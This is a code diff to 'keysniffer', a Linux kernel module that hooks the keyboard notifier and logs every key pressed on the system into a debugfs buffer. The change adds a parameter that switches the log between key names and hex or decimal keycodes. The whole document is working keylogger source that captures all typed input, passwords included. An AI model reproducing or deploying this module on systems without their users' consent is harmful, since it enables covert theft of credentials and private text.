@@ -21,15 +21,27 @@
 #include <linux/init.h>
 #include <linux/kernel.h>
 #include <linux/module.h>
+#include <linux/moduleparam.h>
 #include <linux/keyboard.h>
 #include <linux/debugfs.h>
+#include <linux/input.h>
 
-#define BUF_LEN (PAGE_SIZE << 2) /* 16KB buffer (assuming 4KB PAGE_SIZE) */
+#define BUF_LEN (PAGE_SIZE << 2)        /* 16KB buffer (assuming 4KB PAGE_SIZE) */
+
+#define MAX_ENC_LEN (sizeof(int) << 3)  /* Length of an encoded 'code shift' chunk */
+#define US  0                           /* Type code for US character log */
+#define HEX 1                           /* Type code for hexadecimal log */
+#define DEC 2                           /* Type code for decimal log */
+
+static int codes;                       /* Log type module parameter */
 
 MODULE_LICENSE("GPL v2");
 MODULE_AUTHOR("Arun Prakash Jana <engineerarun@gmail.com>");
 MODULE_VERSION("1.4");
 MODULE_DESCRIPTION("Sniff and log keys pressed in the system to debugfs");
+
+module_param(codes, int, 0644);
+MODULE_PARM_DESC(codes, "log format (0:US keys (default), 1:hex keycodes, 2:dec keycodes)");
 
 /* Declarations */
 static struct dentry *file;
@@ -91,9 +103,9 @@ const struct file_operations keys_fops = {
 };
 
 static ssize_t keys_read(struct file *filp,
-		char *buffer,
-		size_t len,
-		loff_t *offset)
+			 char *buffer,
+			 size_t len,
+			 loff_t *offset)
 {
 	return simple_read_from_buffer(buffer, len, offset, keys_buf, buf_pos);
 }
@@ -102,40 +114,59 @@ static struct notifier_block keysniffer_blk = {
 	.notifier_call = keysniffer_cb,
 };
 
+void keycode_to_string(int keycode, int shift_mask, char *buf, int type)
+{
+	switch (type) {
+	case US:
+		if (keycode >= 0x1 && keycode <= 0x77) {
+			const char *us_key = (shift_mask == 1)
+			? us_keymap[keycode][1]
+			: us_keymap[keycode][0];
+
+			snprintf(buf, MAX_ENC_LEN, "%s", us_key);
+		}
+		break;
+	case HEX:
+		if (keycode < KEY_MAX)
+			snprintf(buf, MAX_ENC_LEN, "%x %x", keycode, shift_mask);
+		break;
+	case DEC:
+		if (keycode < KEY_MAX)
+			snprintf(buf, MAX_ENC_LEN, "%d %d", keycode, shift_mask);
+		break;
+	}
+}
+
 /* Keypress callback */
 int keysniffer_cb(struct notifier_block *nblock,
-		unsigned long code,
-		void *_param)
+		  unsigned long code,
+		  void *_param)
 {
 	size_t len;
+	char keybuf[MAX_ENC_LEN] = {0};
 	struct keyboard_notifier_param *param = _param;
-	const char *pressed_key;
 
 	pr_debug("code: 0x%lx, down: 0x%x, shift: 0x%x, value: 0x%x\n",
-		code, param->down, param->shift, param->value);
+		 code, param->down, param->shift, param->value);
 
 	if (!(param->down))
 		return NOTIFY_OK;
 
-	if (param->value >= 0x1 && param->value <= 0x77) {
-		pressed_key = param->shift
-				? us_keymap[param->value][1]
-				: us_keymap[param->value][0];
-		if (pressed_key) {
-			len = strlen(pressed_key);
+	keycode_to_string(param->value, param->shift, keybuf, codes);
+	len = strlen(keybuf);
 
-			if ((buf_pos + len) >= BUF_LEN) {
-				memset(keys_buf, 0, BUF_LEN);
-				buf_pos = 0;
-			}
+	if (len < 1)
+		return NOTIFY_OK;
 
-			strncpy(keys_buf + buf_pos, pressed_key, len);
-			buf_pos += len;
-			keys_buf[buf_pos++] = '\n';
-
-			pr_debug("%s\n", pressed_key);
-		}
+	if ((buf_pos + len) >= BUF_LEN) {
+		memset(keys_buf, 0, BUF_LEN);
+		buf_pos = 0;
 	}
+
+	strncpy(keys_buf + buf_pos, keybuf, len);
+	buf_pos += len;
+	keys_buf[buf_pos++] = '\n';
+	pr_debug("%s\n", keybuf);
 
 	return NOTIFY_OK;
 }
@@ -143,6 +174,9 @@ int keysniffer_cb(struct notifier_block *nblock,
 static int __init keysniffer_init(void)
 {
 	buf_pos = 0;
+
+	if (codes < 0 || codes > 2)
+                return -EINVAL;
 
 	subdir = debugfs_create_dir("kisni", NULL);
 	if (IS_ERR(subdir))
